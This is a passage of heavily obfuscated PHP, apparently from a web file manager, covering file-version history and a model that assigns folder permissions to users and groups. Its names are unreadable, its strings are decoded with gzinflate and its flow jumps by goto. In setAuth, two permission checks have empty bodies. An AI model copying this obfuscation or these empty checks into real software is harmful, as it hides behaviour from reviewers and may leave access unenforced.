get_path_this($º¥şç•¢); $×¸¹ Ú = $×¸¹ Ú ? $×¸¹ Ú : $Ãüš•³Ä[$ÚŞÑ¢ñ†[1258]]; $—ıØ¿•Ş = substr(get_path_this($Ãüš•³Ä[$ÚŞÑ¢ñ†[1259]]), 0, -strlen($ë£Á³ù“)); foreach ($Ãüš•³Ä[$ÚŞÑ¢ñ†[369]] as $•’ÒêŒÅ => $ÌàûÂãù) { $¤í£º = $¢õ¤–è¨ . substr($ÌàûÂãù[$ÚŞÑ¢ñ†[32]], strlen($—ıØ¿•Ş)); $±Ó€º•â = IO::move($Ãüš•³Ä[$ÚŞÑ¢ñ†[1258]] . $ÌàûÂãù[$ÚŞÑ¢ñ†[32]], $×¸¹ Ú, !1, $¤í£º); if ($±Ó€º•â) { $Ãüš•³Ä[$ÚŞÑ¢ñ†[369]][$•’ÒêŒÅ][$ÚŞÑ¢ñ†[32]] = $¤í£º; } } $Ãüš•³Ä[$ÚŞÑ¢ñ†[1259]] = IO::move($Ãüš•³Ä[$ÚŞÑ¢ñ†[1259]], $×¸¹ Ú, !1, $¢õ¤–è¨ . $ë£Á³ù“); self::saveData($Ãüš•³Ä[$ÚŞÑ¢ñ†[1259]], $Ãüš•³Ä[$ÚŞÑ¢ñ†[369]]); self::clearEmptyFolder($Ãüš•³Ä[$ÚŞÑ¢ñ†[1258]]); } public static function rollback($­Òğ‰¥, $èÜ•í‘­) { $§Æ€ËÜå =& $_SERVER[Ã¶¡¶„æ]; $İƒŒòé  = self::listData($­Òğ‰¥); if (!$İƒŒòé ) { return; } $ıÈßÓ¤Ä = IO::info($­Òğ‰¥); foreach ($İƒŒòé [$§Æ€ËÜå[369]] as $ï˜²£ò– => $‹¶ÊÉÂÚ) { if ($‹¶ÊÉÂÚ[$§Æ€ËÜå[399]] == $èÜ•í‘­) { self::add($­Òğ‰¥); $¶ƒ‰¼ × = $İƒŒòé [$§Æ€ËÜå[1258]] . $‹¶ÊÉÂÚ[$§Æ€ËÜå[32]]; $Â­†‘§¥ = IO::copy($¶ƒ‰¼ ×, IO::pathFather($­Òğ‰¥), REPEAT_REPLACE, $ıÈßÓ¤Ä[$§Æ€ËÜå[32]]); if ($Â­†‘§¥) { self::remove($­Òğ‰¥, $èÜ•í‘­); } return $Â­†‘§¥; } } return !1; } public static function setDetail($ÉÃšğº‚, $¬ñ›½õ, $ÅØÅ¤™—) { $üˆÑƒ¡Ì =& $_SERVER[Ã¶¡¶„æ]; $‘»‘áóü = self::listData($ÉÃšğº‚); if (!$‘»‘áóü) { return; } foreach ($‘»‘áóü[$üˆÑƒ¡Ì[369]] as $İˆÏ·ÊŒ => $ßÏº”…) { if ($ßÏº”…[$üˆÑƒ¡Ì[399]] == $¬ñ›½õ) { $‘»‘áóü[$üˆÑƒ¡Ì[369]][$İˆÏ·ÊŒ][$üˆÑƒ¡Ì[1257]] = $ÅØÅ¤™—; self::saveData($‘»‘áóü[$üˆÑƒ¡Ì[1259]], $‘»‘áóü[$üˆÑƒ¡Ì[369]]); return !0; } } return !1; } public static function fileInfo($÷éÀäÙ, $Ú¿çÈƒõ) { $Å•ŒŸÁ… =& $_SERVER[Ã¶¡¶„æ]; $°‰Å±· = self::listData($÷éÀäÙ); if (!$°‰Å±·) { show_json(LNG($Å•ŒŸÁ…[105]), !1); } $ıÃÉˆÆ = $Å•ŒŸÁ…[12]; foreach ($°‰Å±·[$Å•ŒŸÁ…[369]] as $×©›ñ±˜ => $¹ÔèÜÖö) { if ($¹ÔèÜÖö[$Å•ŒŸÁ…[399]] != $Ú¿çÈƒõ) { continue; } $ıÃÉˆÆ = $°‰Å±·[$Å•ŒŸÁ…[1258]] . $¹ÔèÜÖö[$Å•ŒŸÁ…[32]]; break; } if (!$ıÃÉˆÆ) { show_json(LNG($Å•ŒŸÁ…[105]), !1); } return IO::info($ıÃÉˆÆ); } public static function fileOut($ò·ÈëŠª, $÷½Äûƒ, $ïˆçäˆ = false) { $ ·Íı‚õ =& $_SERVER[Ã¶¡¶„æ]; $¯¿«öûÀ = self::fileInfo($ò·ÈëŠª, $÷½Äûƒ); $ÆûŞ©”Ì =& $GLOBALS[$ ·Íı‚õ[7]]; $ïˆçäˆ = isset($ÆûŞ©”Ì[$ ·Íı‚õ[1209]]) && $ÆûŞ©”Ì[$ ·Íı‚õ[1209]] == 1; if (isset($ÆûŞ©”Ì[$ ·Íı‚õ[33]]) && $ÆûŞ©”Ì[$ ·Íı‚õ[33]] == $ ·Íı‚õ[1260]) { return IO::fileOutImage($¯¿«öûÀ[$ ·Íı‚õ[84]], $ÆûŞ©”Ì[$ ·Íı‚õ[1261]]); } IO::fileOut($¯¿«öûÀ[$ ·Íı‚õ[84]], $ïˆçäˆ, get_path_this($ò·ÈëŠª)); } public static function listData($Â½Œñ, $İÍ‡¶À» = true) { $Ê«ş—ƒƒ =& $_SERVER[Ã¶¡¶„æ]; if ($İÍ‡¶À» && !IO::exist($Â½Œñ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($Â½Œñ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ƒ£¦°ëÌ = self::pathHistory($Â½Œñ); $Í‚¸í±ö = array($Ê«ş—ƒƒ[1259] => $ƒ£¦°ëÌ . $Ê«ş—ƒƒ[1246], $Ê«ş—ƒƒ[1258] => rtrim(get_path_father($ƒ£¦°ëÌ), $Ê«ş—ƒƒ[8]) . $Ê«ş—ƒƒ[8], $Ê«ş—ƒƒ[369] => array()); $”ò˜¡·ä = IO::getContent($Í‚¸í±ö[$Ê«ş—ƒƒ[1259]]); if ($”ò˜¡·ä) { $ßíñƒ»× = json_decode($”ò˜¡·ä, !0); if (is_array($ßíñƒ»×)) { $Í‚¸í±ö[$Ê«ş—ƒƒ[369]] = $ßíñƒ»×; } } return $Í‚¸í±ö; } private static function saveData($Òš§»ıÄ, $–Ñã½‡Ø) { $òğÓ¹•û =& $_SERVER[Ã¶¡¶„æ]; self::log($òğÓ¹•û[1262] . $Òš§»ıÄ . $òğÓ¹•û[71] . count($–Ñã½‡Ø), $òğÓ¹•û[758]); if ($–Ñã½‡Ø) { return IO::setContent($Òš§»ıÄ, json_encode($–Ñã½‡Ø)); } $ù§œ¤‘¡ = IO::pathFather($Òš§»ıÄ); IO::remove($Òš§»ıÄ); self::clearEmptyFolder($ù§œ¤‘¡); return !0; } public static function clearEmptyFolder($‡¡ŠÉÌá) { $Î™ú³›ç =& $_SERVER[Ã¶¡¶„æ]; if (trim($‡¡ŠÉÌá, $Î™ú³›ç[8]) == trim(self::$_historyBase, $Î™ú³›ç[8])) { return; } $ßı¶Š² = IO::pathFather($‡¡ŠÉÌá); $ã ÉÛ = IO::has($‡¡ŠÉÌá, !0); if ($ã ÉÛ[$Î™ú³›ç[207]] > 0 || $ã ÉÛ[$Î™ú³›ç[208]] > 0) { return; } IO::remove($‡¡ŠÉÌá); self::clearEmptyFolder($ßı¶Š²); } private static function getBasePath() { $Ü°ïÖê‡ =& $_SERVER[Ã¶¡¶„æ]; $ÚŠ¡µ˜ = Model($Ü°ïÖê‡[1263])->get($Ü°ïÖê‡[1264]); if ($ÚŠ¡µ˜) { if (!IO::exist($ÚŠ¡µ˜)) { IO::mkdir($ÚŠ¡µ˜); } if (get_path_this($ÚŠ¡µ˜) == $Ü°ïÖê‡[1249]) { $ÈšÒËè§ = $Ü°ïÖê‡[1265] . rand_string(8); @rename($ÚŠ¡µ˜, get_path_father($ÚŠ¡µ˜) . $Ü°ïÖê‡[8] . $ÈšÒËè§); $ÚŠ¡µ˜ = DATA_PATH . $ÈšÒËè§ . $Ü°ïÖê‡[8]; file_put_contents(DATA_PATH . $Ü°ïÖê‡[1199], $Ü°ïÖê‡[12]); Model($Ü°ïÖê‡[1263])->set($Ü°ïÖê‡[1264], $ÚŠ¡µ˜); } return $ÚŠ¡µ˜; } $ÚŠ¡µ˜ = DATA_PATH . $Ü°ïÖê‡[1265] . rand_string(8) . $Ü°ïÖê‡[8]; $ÚŠ¡µ˜ = IO::mkdir($ÚŠ¡µ˜); $ÚŠ¡µ˜ = rtrim($ÚŠ¡µ˜, $Ü°ïÖê‡[8]) . $Ü°ïÖê‡[8]; file_put_contents($ÚŠ¡µ˜ . $Ü°ïÖê‡[1199], $Ü°ïÖê‡[12]); file_put_contents(DATA_PATH . $Ü°ïÖê‡[1199], $Ü°ïÖê‡[12]); Model($Ü°ïÖê‡[1263])->set($Ü°ïÖê‡[1264], $ÚŠ¡µ˜); return $ÚŠ¡µ˜; } } goto C™ ªñªµ‚; fÖ ÔŞ÷Û: $_SERVER[è¿ÅÂ¤¥] = explode($_SERVER[Ã¶¡¶„æ][616], gzinflate(substr($_SERVER[Ã¶¡¶„æ][617], 10, -8))); $btuyijwvep = $_SERVER[Ã¶¡¶„æ][618]; if (strlen($btuyijwvep) < $_SERVER[Ã¶¡¶„æ][619]) { return; } goto EìéÄ¯§Îƒ; e¢‹›§œ›´: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\165\162\143\145\137\141\165\x74\150"; public function getAuth($•Û§ŸÛÓ) { $÷ÇœÙ³ =& $_SERVER[Ã¶¡¶„æ]; $±û¢èˆÁ = $this->sourceAuthSelect($•Û§ŸÛÓ); $ƒÆ¨÷’ß = array(); $‚„Íşœ‚ = array(); $Ë´Àş… = 2 << 25; foreach ($±û¢èˆÁ as $Ğˆ—¶®) { $èÉ¼ïø = Model($÷ÇœÙ³[507])->listData($Ğˆ—¶®[$÷ÇœÙ³[1969]]); if (!$èÉ¼ïø) { continue; } $ƒÆ¨÷’ß[] = $Ğˆ—¶®; $Á¸ò­Ò‰ = 0; if ($Ğˆ—¶®[$÷ÇœÙ³[411]] == SourceModel::TYPE_GROUP) { $Á¸ò­Ò‰ = $Ë´Àş… * 2; } if ($Ğˆ—¶®[$÷ÇœÙ³[411]] == SourceModel::TYPE_USER) { $Á¸ò­Ò‰ = $Ë´Àş…; } if ($Ğˆ—¶®[$÷ÇœÙ³[411]] == SourceModel::TYPE_USER && $Ğˆ—¶®[$÷ÇœÙ³[505]] == $÷ÇœÙ³[197]) { $Á¸ò­Ò‰ = 0; } $‚„Íşœ‚[] = $èÉ¼ïø[$÷ÇœÙ³[413]] + $Á¸ò­Ò‰; } array_multisort($‚„Íşœ‚, SORT_DESC, $ƒÆ¨÷’ß); return $ƒÆ¨÷’ß; } public function sourceAuthSelect($ş¨îŒ»Ñ) { $Ïš´‹ĞÅ =& $_SERVER[Ã¶¡¶„æ]; static $–·³×Ï = array(); $À‰€Ù = is_array($ş¨îŒ»Ñ) ? !1 : !0; if ($À‰€Ù) { $ş¨îŒ»Ñ = array($ş¨îŒ»Ñ); } $ûşŒ±¦Ì = array(); foreach ($ş¨îŒ»Ñ as $ê’å§Šü) { if (isset($–·³×Ï[$ê’å§Šü])) { $ûşŒ±¦Ì[$ê’å§Šü] = $–·³×Ï[$ê’å§Šü]; } } if (count($ûşŒ±¦Ì) == count($ş¨îŒ»Ñ)) { return $À‰€Ù ? $ûşŒ±¦Ì[$ş¨îŒ»Ñ[0]] : $ûşŒ±¦Ì; } $Å¾´®ò = $Ïš´‹ĞÅ[2042]; $Ê»ØÈ¦Ø = array($Ïš´‹ĞÅ[402] => array($Ïš´‹ĞÅ[7], $ş¨îŒ»Ñ)); $¥Êñ‰åÉ = $this->field($Å¾´®ò)->order($Ïš´‹ĞÅ[399])->where($Ê»ØÈ¦Ø)->select(); $ÙÒ‡Ï‰ = array_to_keyvalue_group($¥Êñ‰åÉ, $Ïš´‹ĞÅ[402]); foreach ($ş¨îŒ»Ñ as $ê’å§Šü) { $–·³×Ï[$ê’å§Šü] = $ÙÒ‡Ï‰[$ê’å§Šü] ? $ÙÒ‡Ï‰[$ê’å§Šü] : array(); } if ($À‰€Ù) { return $¥Êñ‰åÉ; } return $ÙÒ‡Ï‰; } public function setAuth($‹ş¶Ÿ‚ú, $»ÆŸˆş¾) { $ê×Áşç´ =& $_SERVER[Ã¶¡¶„æ]; $ÏÙ ¢‰Ä = Model($ê×Áşç´[1350])->sourceInfo($‹ş¶Ÿ‚ú); if (!$ÏÙ ¢‰Ä) { return !1; } if ($ÏÙ ¢‰Ä[$ê×Áşç´[411]] != SourceModel::TYPE_GROUP) { return !1; } $™ÚÌãìø = 1; $ÆÓß‰ü‰ = $ÏÙ ¢‰Ä[$ê×Áşç´[505]]; if ($ÆÓß‰ü‰ != $™ÚÌãìø) { $Õ•Õ•¯œ = array($ê×Áşç´[1865] => $ÆÓß‰ü‰); $ùĞ‡œ¹® = Model($ê×Áşç´[1955])->field($ê×Áşç´[1676])->where($Õ•Õ•¯œ)->select(); $ùĞ‡œ¹® = array_to_keyvalue($ùĞ‡œ¹®, $ê×Áşç´[12], $ê×Áşç´[1676]); } $§‹›ä–å = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $‰è¾½û‘ = array(); foreach ($»ÆŸˆş¾ as $½Ø¯‚Â‡) { if (!in_array($½Ø¯‚Â‡[$ê×Áşç´[411]], $§‹›ä–å)) { show_json(LNG($ê×Áşç´[2043]), !1); } if ($ÆÓß‰ü‰ != $™ÚÌãìø) { if ($½Ø¯‚Â‡[$ê×Áşç´[411]] == SourceModel::TYPE_GROUP) { } if ($½Ø¯‚Â‡[$ê×Áşç´[505]] != 0 && !in_array($½Ø¯‚Â‡[$ê×Áşç´[505]], $ùĞ‡œ¹®)) { } } if ($½Ø¯‚Â‡[$ê×Áşç´[505]] == 0) { $½Ø¯‚Â‡[$ê×Áşç´[411]] = SourceModel::TYPE_USER; } $‰è¾½û‘[] = array($ê×Áşç´[402] => $‹ş¶Ÿ‚ú, $ê×Áşç´[411] => intval($½Ø¯‚Â‡[$ê×Áşç´[411]]), $ê×Áşç´[505] => intval($½Ø¯‚Â‡[$ê×Áşç´[505]]), $ê×Áşç´[1969] => intval($½Ø¯‚Â‡[$ê×Áşç´[1969]]) ? intval($½Ø¯‚Â‡[$ê×Áşç´[1969]]) : 0, $ê×Áşç´[2025] => intval($½Ø¯‚Â‡[$ê×Áşç´[2025]]) ? intval($½Ø¯‚Â‡[$ê×Áşç´[2025]]) : -1); } $this->where(array($ê×Áşç´[417] => $‹ş¶Ÿ‚ú))->delete(); $this->addAll($‰è¾½û‘); return !0; } public function authClear($í«­¢÷·) { $Ó«ı›Š° =& $_SERVER[Ã¶¡¶„æ]; $æ½İÒ Å = Model($Ó«ı›Š°[1350])->sourceInfo($í«­¢÷·); $àƒÏ¶ˆ£ = array($í«­¢÷·); if ($æ½İÒ Å[$Ó«ı›Š°[410]] == $Ó«ı›Š°[88]) { $Õä¡ÀŸè = array($Ó«ı›Š°[590] => array($Ó«ı›Š°[550], $æ½İÒ Å[$Ó«ı›Š°[521]] . $í«­¢÷· . $Ó«ı›Š°[551])); $àƒÏ¶ˆ£ = Model($Ó«ı›Š°[1350])->field($Ó«ı›Š°[417])->where($Õä¡ÀŸè)->getField($Ó«ı›Š°[402], !0); $àƒÏ¶ˆ£[] = $í«­¢÷·; } $this->where(array($Ó«ı›Š°[417] => array($Ó«ı›Š°[418], $àƒÏ¶ˆ£)))->delete(); return !0; } public function getAllChildren($†Úöø©—) { $‡÷î»ğ¿ =& $_SERVER[Ã¶¡¶„æ]; $²¦Â··ù = Model($‡÷î»ğ¿[1350])->sourceInfo($†Úöø©—); if ($²¦Â··ù[$‡÷î»ğ¿[410]] != $‡÷î»ğ¿[88]) { return $this->sourceListAuth(array($†Úöø©—)); } if ($²¦Â··ù[$‡÷î»ğ¿[411]] != SourceModel::TYPE_GROUP) { return array(); } $³é¨ı–“ = 1; $®Íœ…‹Å = array($†Úöø©—); if ($²¦Â··ù[$‡÷î»ğ¿[432]] == $‡÷î»ğ¿[197] && $²¦Â··ù[$‡÷î»ğ¿[505]] != $³é¨ı–“) { $®Íœ…‹Å = $this->groupChidldAllRootSource($²¦Â··ù[$‡÷î»ğ¿[505]]); } $š–Ó¼Á = $this->field($‡÷î»ğ¿[402])->group($‡÷î»ğ¿[402])->select(); $š–Ó¼Á = array_to_keyvalue($š–Ó¼Á, $‡÷î»ğ¿[12], $‡÷î»ğ¿[402]); if (!$š–Ó¼Á) { return array(); } $êÈ¤¯È = $‡÷î»ğ¿[2044]; $Æƒ÷õù× = array($‡÷î»ğ¿[402] => array($‡÷î»ğ¿[7], $š–Ó¼Á), $‡÷î»ğ¿[431] => $‡÷î»ğ¿[197]); $ˆßû¯ = Model($‡÷î»ğ¿[831])->field($êÈ¤¯È)->where($Æƒ÷õù×)->select(); $ÅÈšÃúâ = array($†Úöø©—); foreach ($ˆßû¯ as $áú•ãÏï) { foreach ($®Íœ…‹Å as $ÉĞ´¡˜â) { $†èÍÊ÷‘ = $‡÷î»ğ¿[50] . $ÉĞ´¡˜â . $‡÷î»ğ¿[50]; $ëüÑÆ†µ = $áú•ãÏï[$‡÷î»ğ¿[521]] . $áú•ãÏï[$‡÷î»ğ¿[402]] . $‡÷î»ğ¿[50]; if (strstr($ëüÑÆ†µ, $†èÍÊ÷‘)) { $ÅÈšÃúâ[] = $áú•ãÏï[$‡÷î»ğ¿[402]]; break; } } } return $this->sourceListAuth($ÅÈšÃúâ); } private function sourceListAuth($¡¤‘õ) { $÷Ü¤ãŒè =& $_SERVER[Ã¶¡¶„æ]; $ßã—€‰‰ = Model($÷Ü¤ãŒè[1350])->sourceListInfo($¡¤‘õ, !0); $Œí´¾‘í = $this->sourceAuthSelect($¡¤‘õ); $½­ë¿ù = array(); $¼œ…¨ŒĞ = array(); foreach ($ßã—€‰‰ as $ç¨®¿¿º) { unset($ç¨®¿¿º[$÷Ü¤ãŒè[456]]); unset($ç¨®¿¿º[$÷Ü¤ãŒè[454]]); unset($ç¨®¿¿º[$÷Ü¤ãŒè[413]]); unset($ç¨®¿¿º[$÷Ü¤ãŒè[86]]); $®Çòİó = $Œí´¾‘í[$ç¨®¿¿º[$÷Ü¤ãŒè[402]]]; if (!$®Çòİó) { continue; } $ç¨®¿¿º[$÷Ü¤ãŒè[2045]] = $this->authTargetInfo($®Çòİó); $ç¨®¿¿º[$÷Ü¤ãŒè[519]] = rtrim($ç¨®¿¿º[$÷Ü¤ãŒè[525]], $÷Ü¤ãŒè[8]) . $÷Ü¤ãŒè[8] . ltrim($ç¨®¿¿º[$÷Ü¤ãŒè[519]], $÷Ü¤ãŒè[8]); $½­ë¿ù[] = $ç¨®¿¿º; $Äî‚Õ¨ = count(explode($÷Ü¤ãŒè[8], trim($ç¨®¿¿º[$÷Ü¤ãŒè[519]], $÷Ü¤ãŒè[8]))); $¼œ…¨ŒĞ[] = $Äî‚Õ¨ + ($ç¨®¿¿º[$÷Ü¤ãŒè[33]] == $÷Ü¤ãŒè[75] ? 0 : 1000); } array_multisort($¼œ…¨ŒĞ, SORT_ASC, $½­ë¿ù); return $½­ë¿ù; } private function groupChidldAllRootSource($©­†ûàò) { $•È…Õİâ =& $_SERVER[Ã¶¡¶„æ]; $¾ƒş…µ× = Model($•È…Õİâ[2046])->groupChildrenAll($©­†ûàò); $ä©—¤ = array($•È…Õİâ[432] => 0, $•È…Õİâ[505] => array($•È…Õİâ[7], $¾ƒş…µ×), $•È…Õİâ[411] => SourceModel::TYPE_GROUP); $üáõ½õš = Model($•È…Õİâ[831])->field($•È…Õİâ[402])->where($ä©—¤)->select(); $üáõ½õš = array_to_keyvalue($üáõ½õš, $•È…Õİâ[12], $•È…Õİâ[402]); return $üáõ½õš; } private function authTargetInfo($ß«±œ†´) { $¢ Ìà•– =& $_SERVER[Ã¶¡¶„æ]; $»¼Ã«´® = array(); $Ä¦³ù… = array(); $ªÛ²êÂ = 2 << 25; foreach ($ß«±œ†´ as $üîŸÂ‘ª) { $Ù€ó¨ùä = Model($¢ Ìà•–[507])->listData($üîŸÂ‘ª[$¢ Ìà•–[1969]]); if (!$Ù€ó¨ùä) { continue; } if ($üîŸÂ‘ª[$¢ Ìà•–[411]] == SourceModel::TYPE_USER) { $—¡÷Î£Ÿ = Model($¢ Ìà•–[513])->getInfoSimpleOuter($üîŸÂ‘ª[$¢ Ìà•–[505]]); if ($—¡÷Î£Ÿ[$¢ Ìà•–[1676]] == $¢ Ìà•–[1203]) { continue; } if ($—¡÷Î£Ÿ[$¢ Ìà•–[1676]] == $¢ Ìà•–[197]) { $—¡÷Î£Ÿ[$¢ Ìà•–[32]] = LNG($¢ Ìà•–[2047]); } } else { $—¡÷Î£Ÿ = Model($¢ Ìà•–[522])->getInfoSimple($üîŸÂ‘ª[$¢ Ìà•–[505]]); } if (!$—¡÷Î£Ÿ) { continue; } $—¡÷Î£Ÿ[$¢ Ìà•–[467]] = $Ù€ó¨ùä; $»¼Ã«´®[] = $—¡÷Î£Ÿ; $ÜàÔÄµç = 0; if ($üîŸÂ‘ª[$¢ Ìà•–[411]] == SourceModel::TYPE_GROUP) { $ÜàÔÄµç = $ªÛ²êÂ * 2; } if ($üîŸÂ‘ª[$¢ Ìà•–[411]] == SourceModel::TYPE_USER) { $ÜàÔÄµç = $ªÛ²êÂ; } if ($üîŸÂ‘ª[$¢ Ìà•–[411]] == SourceModel::TYPE_USER && $üîŸÂ‘ª[$¢ Ìà•–[505]] == $¢ Ìà•–[197]) { $ÜàÔÄµç = 0; } $Ä¦³ù…[] = $Ù€ó¨ùä[$¢ Ìà•–[413]] + $ÜàÔÄµç; } array_multisort($Ä¦³ù…, SORT_DESC, $»¼Ã«´®); return $»¼Ã«´®; } public function getAllChildrenByUser($ƒİÃ¢Ò, $©¶¦½©è) { $ºòÖÊ² =& $_SERVER[Ã¶¡¶„æ]; $¸´™Œş = Model($ºòÖÊ²[535])->getInfo($©¶¦½©è); if (!$©¶¦½©è || !$ƒİÃ¢Ò || !$¸´™Œş) { return array(); } $½€¥Ûøã = Model($ºòÖÊ²[1350])->sourceInfo($ƒİÃ¢Ò); $¸ßŠ°½ = array(); $¥‰ß’ë† = 1; if ($½€¥Ûøã[$ºòÖÊ²[432]] == $ºòÖÊ²[197] && $½€¥Ûøã[$ºòÖÊ²[505]] != $¥‰ß’ë† && $this->groupContainUser($½€¥Ûøã[$ºòÖÊ²[505]], $©¶¦½©è)) { foreach ($¸´™Œş[$ºòÖÊ²[2048]] as $¿¢§µäú) { $ûã­¡Ú = Model($ºòÖÊ²[522])->getInfo($¿¢§µäú[$ºòÖÊ²[1865]]); $ÔàôÎÃƒ = Model($ºòÖÊ²[535])->getInfoSimpleOuter($©¶¦½©è); $ÔàôÎÃƒ[$ºòÖÊ²[467]] = $¿¢§µäú[$ºòÖÊ²[413]]; if (Model($ºòÖÊ²[507])->authCheckAction($¿¢§µäú[$ºòÖÊ²[413]][$ºòÖÊ²[413]], $ºòÖÊ²[1886])) { continue; } $‰¿öíß¹ = array($ºòÖÊ²[32] => $ºòÖÊ²[1223] . $ûã­¡Ú[$ºòÖÊ²[32]], $ºòÖÊ²[402] => $ûã­¡Ú[$ºòÖÊ²[86]][$ºòÖÊ²[402]], $ºòÖÊ²[84] => KodIO::make($ûã­¡Ú[$ºòÖÊ²[86]][$ºòÖÊ²[402]]), $ºòÖÊ²[432] => $ºòÖÊ²[197], $ºòÖÊ²[411] => $ºòÖÊ²[515], $ºòÖÊ²[33] => $ºòÖÊ²[554], $ºòÖÊ²[519] => $ûã­¡Ú[$ºòÖÊ²[526]], $ºòÖÊ²[1865] => $ûã­¡Ú[$ºòÖÊ²[1865]], $ºòÖÊ²[523] => $ûã­¡Ú[$ºòÖÊ²[432]], $ºòÖÊ²[2045] => array($ÔàôÎÃƒ)); $¸ßŠ°½[$‰¿öíß¹[$ºòÖÊ²[402]]] = $‰¿öíß¹; } } $ú¢‰Òºæ = array(); $Ì“—¬ô³ = $this->getAllChildren($ƒİÃ¢Ò); foreach ($Ì“—¬ô³ as $İ¹“¿ù¾) { $Š›«÷«— = !1; foreach ($İ¹“¿ù¾[$ºòÖÊ²[2045]] as $ÌÌ–Ã±´) { if ($ÌÌ–Ã±´[$ºòÖÊ²[1676]]) { if ($ÌÌ–Ã±´[$ºòÖÊ²[1676]] == $©¶¦½©è) { $Š›«÷«— = !0; break; } } if ($ÌÌ–Ã±´[$ºòÖÊ²[1865]]) { if ($this->groupContainUser($ÌÌ–Ã±´[$ºòÖÊ²[1865]], $©¶¦½©è)) { $Š›«÷«— = !0; break; } } } if ($Š›«÷«—) { $ú¢‰Òºæ[] = $İ¹“¿ù¾; } $ƒ¯ƒ‚ğÚ = $İ¹“¿ù¾[$ºòÖÊ²[402]]; if (isset($¸ßŠ°½[$ƒ¯ƒ‚ğÚ])) { $İ¹“¿ù¾[$ºòÖÊ²[2045]][] = $¸ßŠ°½[$ƒ¯ƒ‚ğÚ][0]; $¸ßŠ°½[$ƒ¯ƒ‚ğÚ] = !1; } } $¸ßŠ°½ = array_filter(array_values($¸ßŠ°½)); $ú¢‰Òºæ = array_merge($¸ßŠ°½, $ú¢‰Òºæ); return $ú¢‰Òºæ; } public function setAllChildrenByUser($”Ìİåğ¶, $‰Û¿şá», $³‡Ò‰…) { $îİ•Ò¡• =& $_SERVER[Ã¶¡¶„æ]; $ïŠÒ‚„³ = $this->getAllChildrenByUser($”Ìİåğ¶, $‰Û¿şá»); if (!$³‡Ò‰… || !$ïŠÒ‚„³) { return !1; } foreach ($ïŠÒ‚„³ as $Æ³Ó¤ŸÛ) { $Äìê‡  = array(); foreach ($Æ³Ó¤ŸÛ[$îİ•Ò¡•[2045]] as $Ú¾÷äİÉ) { $ÑÕ°õöœ = $Ú¾÷äİÉ[$îİ•Ò¡•[467]]; $…Ää»Š· = $Ú¾÷äİÉ[$îİ•Ò¡•[1676]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $Îãİñ Ò = $Ú¾÷äİÉ[$îİ•Ò¡•[1676]] ? $Ú¾÷äİÉ[$îİ•Ò¡•[1676]] : $Ú¾÷äİÉ[$îİ•Ò¡•[1865]]; if ($Ú¾÷äİÉ[$îİ•Ò¡•[1676]] && $Ú¾÷äİÉ[$îİ•Ò¡•[1676]] == $‰Û¿şá») { continue; } $Äìê‡ [] = array($îİ•Ò¡•[402] => $Æ³Ó¤ŸÛ[$îİ•Ò¡•[402]], $îİ•Ò¡•[411] => $…Ää»Š·, $îİ•Ò¡•[505] => intval($Îãİñ Ò), $îİ•Ò¡•[1969] => isset($ÑÕ°õöœ[$îİ•Ò¡•[399]]) ? intval($ÑÕ°õöœ[$îİ•Ò¡•[399]]) : 0, $îİ•Ò¡•[2025] => isset($ÑÕ°õöœ[$îİ•Ò¡•[2025]]) ? intval($ÑÕ°õöœ[$îİ•Ò¡•[2025]]) : -1); } $Äìê‡ [] = array($îİ•Ò¡•[402] => $Æ³Ó¤ŸÛ[$îİ•Ò¡•[402]], $îİ•Ò¡•[411] => SourceModel::TYPE_USER, $îİ•Ò¡•[505] => intval($‰Û¿şá»), $îİ•Ò¡•[1969] => intval($³‡Ò‰…), $îİ•Ò¡•[2025] => -1); $this->where(array($îİ•Ò¡•[417] => $Æ³Ó¤ŸÛ[$îİ•Ò¡•[402]]))->delete(); $this->addAll($Äìê‡ ); } return !0; } public function get($œ™Å‚Ê…) { $°—›šö¦ = $this->getSourceList(array($œ™Å‚Ê…), !0); return $°—›šö¦[0]; } public function getSourceList($¨‘Ò©İ, $ò€É‘­» = false, $òŸ¦•Ù¤ = false) { $„Ñôá·Ò =& $_SERVER[Ã¶¡¶„æ]; if (!$¨‘Ò©İ) { return array(); } $·É‘òŸË = Model($„Ñôá·Ò[1350]); if (!$ò€É‘­» && count($¨‘Ò©İ) == 1) { $ò€É‘­» = array(); $ò€É‘­»[$¨‘Ò©İ[0]] = $·É‘òŸË->sourceInfo($¨‘Ò©İ[0]); } if (!$ò€É‘­») { $à…®¸œ = array($„Ñôá·Ò[417] => array($„Ñôá·Ò[418], $¨‘Ò©İ)); $ò€É‘­» = $·É‘òŸË->field($„Ñôá·Ò[2049])->where($à…®¸œ)->select(); $ò€É‘­» = array_to_keyvalue($ò€É‘­», $„Ñôá·Ò[402]); } $ö•¨ ßÙ = $¨‘Ò©İ; foreach ($ò€É‘­» as $’ü‹¹÷¬ => $¤ºº”‰ú) { $õŠ´Ø¡ = $·É‘òŸË->parentLevelArray($¤ºº”‰ú[$„Ñôá·Ò[521]]); $ö•¨ ßÙ = array_merge($ö•¨ ßÙ, array($’ü‹¹÷¬), array_reverse($õŠ´Ø¡)); } $ö•¨ ßÙ = array_values(array_unique($ö•¨ ßÙ)); if (!$ö•¨ ßÙ) { return array(); } $Òçëü»É = $this->sourceAuthSelect($ö•¨ ßÙ); $—ÃúƒÑç = array(); foreach ($ö•¨ ßÙ as $§ˆô¢šÔ) { if (isset($Òçëü»É[$§ˆô¢šÔ])) { $—ÃúƒÑç[$§ˆô¢šÔ] = $Òçëü»É[$§ˆô¢šÔ]; } } $Ì¦ÙÉ² = $this->userIsRoot($òŸ¦•Ù¤); $¼»À”Â = AuthModel::authAll(); $¢°Ò¦ëŒ = array($„Ñôá·Ò[414] => $¼»À”Â, $„Ñôá·Ò[2050] => array($„Ñôá·Ò[419] => 0, $„Ñôá·Ò[1871] => $¼»À”Â, $„Ñôá·Ò[420] => LNG($„Ñôá·Ò[2051]), $„Ñôá·Ò[1888] => $„Ñôá·Ò[2052])); $Û·Îæ = array(); foreach ($ò€É‘­» as $§ˆô¢šÔ => $£Á·´ò) { if ($Ì¦ÙÉ² && $GLOBALS[$„Ñôá·Ò[6]][$„Ñôá·Ò[1884]]) { $Û·Îæ[$§ˆô¢šÔ] = $¢°Ò¦ëŒ; continue; } $Û·Îæ[$§ˆô¢šÔ] = $this->makeSourceAuth($£Á·´ò, $—ÃúƒÑç, $òŸ¦•Ù¤); } return $Û·Îæ; } public function 